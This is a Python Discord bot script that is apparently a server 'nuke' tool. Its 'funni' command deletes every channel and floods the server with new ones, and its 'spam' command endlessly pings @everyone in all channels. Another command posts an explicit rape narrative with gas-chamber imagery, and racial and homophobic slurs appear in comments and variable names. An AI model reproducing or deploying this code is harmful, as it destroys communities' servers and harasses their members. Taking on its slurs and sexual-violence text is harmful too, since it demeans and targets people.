"""
idk why its fucked up like that :( me and my nigga made it in replit so that might be why
"""

import discord
from discord.ext import commands
import asyncio

penny = "ur token frfr"

intents = discord.Intents.all()

garbage = commands.Bot(command_prefix='.', intents=intents, help_command=None) 

@garbage.event
async def on_ready():
    print(f"Invite: https://discord.com/oauth2/authorize?client_id={garbage.user.id}&scope=bot&permissions=8")

@garbage.command()
async def help(ctx):
    await ctx.send("idk bluddeus find out yourself")

@garbage.command()
async def homosexuality(ctx):
    try:
                fag = await ctx.send("*In my room beating my meat.*") # the abyss stares back
                await asyncio.sleep(5)
            
                await fag.edit(content="*You walk into the room while im beating my meat*")
                await asyncio.sleep(5)
            
                await fag.edit(content="*I notice you and my face turns to one of unbridled rage as I get up and pull your pants down, forcing you to bend over.*")
                await asyncio.sleep(5)
            
                await fag.edit(content="*'N-no!', you shout. But to no avail, I continue bending you over as I stroke my penis and prepare to insert it into you.*")
                await asyncio.sleep(5) 
            
                await fag.edit(content="*You try to fight back, punching me, but still it does nothing. I finally insert my penis into you as you scream.*") 
                await asyncio.sleep(5)
            
                await fag.edit(content="*As I'm thrusting into you, you realize that actually NOTHING is real, and that you are in a gas chamber of Chinese politician, revolutionary, and dictator Mao Zedingaling's gas chamber.*")
                await asyncio.sleep(5)
            
                await fag.edit(content="*You snap out of your gas-induced haze, and as you come to, you notice a guard standing outside so you pull his pants down.*") # theyre here
                await asyncio.sleep(5)
            
                await fag.edit(content="*As you pull his pants down, he attempts to point his gun at you, but you brutally rape his badussy.*") 
                await asyncio.sleep(5)

                await fag.edit(content="*As you bust a phat nut, everyone in the camp INCLUDING Chinese politician, revolutionary, and dictator Mao Zedingaling drop dead to the floor*") 
                await asyncio.sleep(5)

                await fag.edit(content="*Ze end :D*") 
                await asyncio.sleep(5)
    except:
        pass

@garbage.command()
async def spam(ctx): # help
    while True:
        for cum in ctx.guild.channels:
            await cum.send("@everyone nuked by diddy")

@garbage.command()
async def funni(ctx):
    await ctx.message.delete()
    for cum in ctx.guild.channels:
        await cum.delete() # please
    for knigga in range(25):
         await asyncio.create_task(ctx.guild.create_text_channel("nuked by diddy"))

garbage.run(penny)
